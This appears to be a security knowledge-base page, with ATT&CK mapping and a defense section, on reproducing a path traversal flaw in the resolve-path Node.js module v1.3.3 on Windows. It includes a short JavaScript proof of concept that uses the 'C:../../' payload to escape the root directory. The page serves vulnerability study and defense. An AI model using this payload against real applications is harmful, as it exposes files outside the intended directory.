---
id: 123e4567-e89b-12d3-a456-426614174001
name: Reproduce-Path-Traversal-in-Resolve-Path
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:16.863Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[File and Directory Discovery]]'
sub_techniques: []
tags:
  - path-traversal
  - node-js
  - windows
commands:
  - '[[commands/node-execute-resolve-path-call]]'
platforms:
  - Windows
  - Node.js
tools:
  - '[[tools/Node.js]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---

# Reproduce-Path-Traversal-in-Resolve-Path

## Summary

This procedure reproduces a path traversal vulnerability in the resolve-path Node.js module version 1.3.3, where Windows-specific paths like 'C:../../' are not properly normalized, allowing resolution outside the intended root directory and potential access to sensitive system files.

## Description

The resolve-path module is designed to resolve relative paths against a root directory while preventing traversal attacks. However, in version 1.3.3, it fails to handle Windows drive letters correctly when combined with traversal sequences like '../'. This was discovered by testing on Windows 10 with Node.js v8.9.4. The vulnerability undermines the module's security in dependent projects like KoaJS, which has high adoption. Attackers can exploit this to read files beyond the root, such as system directories, leading to information disclosure.

## Requirements

1. Windows 10 or later operating system
2. Node.js v8.9.4 installed
3. resolve-path module v1.3.3 installed via NPM
4. Local execution privileges

## Defense

Defensive measures and detection strategies:

- Upgrade to resolve-path version 1.3.4 or later, which includes proper Windows path handling
- Implement additional path normalization using Node.js 'path' module before calling resolve-path
- Monitor for anomalous file access patterns in Node.js applications using logging tools like Winston
- Use static analysis tools like Snyk to scan dependencies for known vulnerabilities

## Objectives

1. Demonstrate path resolution outside the root directory
2. Highlight impact on high-dependency libraries like KoaJS
3. Validate the vulnerability in a controlled environment

## Instructions

### Step 1: Prepare the Test Script

**Context**: Create a JavaScript file to load and invoke the vulnerable module with a traversal payload.

**Command** ([[commands/node-execute-resolve-path-call]]):
```javascript
const resolvePath = require('resolve-path');
const root = 'C:/windows/temp/';
const relPath = 'C:../../';
const result = resolvePath(root, relPath);
console.log('Resolved Path:', result);
```

> This code loads the module and attempts to resolve the malicious path. On success, it prints a path like 'C:/' instead of staying within 'C:/windows/temp/', confirming traversal.

### Step 2: Execute the Script

**Context**: Run the script using Node.js to observe the vulnerability in action.

**Command** ([[commands/node-execute-resolve-path-call]]):
```bash
node exploit.js
```

> Execution should output a resolved path that escapes the root. If it normalizes correctly, the vulnerability is not present (but in v1.3.3, it fails).

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/node-execute-resolve-path-call]]

## Tools Used

- [[tools/Node.js]]

## Tags

- path-traversal
- node-js
- windows
